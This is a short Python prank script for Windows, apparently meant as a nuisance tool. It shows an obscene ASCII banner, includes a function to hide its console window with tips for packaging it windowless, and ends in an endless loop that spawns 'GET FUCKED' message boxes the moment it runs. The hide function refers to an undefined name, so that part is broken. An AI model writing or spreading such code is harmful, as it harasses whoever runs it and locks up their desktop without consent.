"""Importing modules"""
import ctypes
import win32gui
import win32.lib.win32con as win32

#<---------->

LOGIN_MSG = r"""
 ______     ______     ______      ______   __  __     ______     __  __     ______     _____    
/\  ___\   /\  ___\   /\__  _\    /\  ___\ /\ \/\ \   /\  ___\   /\ \/ /    /\  ___\   /\  __-.  
\ \ \__ \  \ \  __\   \/_/\ \/    \ \  __\ \ \ \_\ \  \ \ \____  \ \  _"-.  \ \  __\   \ \ \/\ \ 
 \ \_____\  \ \_____\    \ \_\     \ \_\    \ \_____\  \ \_____\  \ \_\ \_\  \ \_____\  \ \____- 
  \/_____/   \/_____/     \/_/      \/_/     \/_____/   \/_____/   \/_/\/_/   \/_____/   \/____/ 
                                                                                                 
""" #http://patorjk.com/software/taag/#p=display&f=Sub-Zero&t=GET%20FUCKED
def login():
    """Print login msg"""
    print(LOGIN_MSG)

#<---------->
def hide(): #USE PYINSTALLER "--window" OPTION (https://stackoverflow.com/questions/49648642/convert-pyw-to-exe-and-have-the-command-line-not-open)
    """Hide cmd window"""
    thisprogramm = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(thisprogramm, win32con.SW_HIDE)

#<---------->
def spam():
    """Spam user with windows"""
    while True:
        ctypes.windll.user32.MessageBoxW(2, "GET FUCKED", "LMAO", 16)


spam()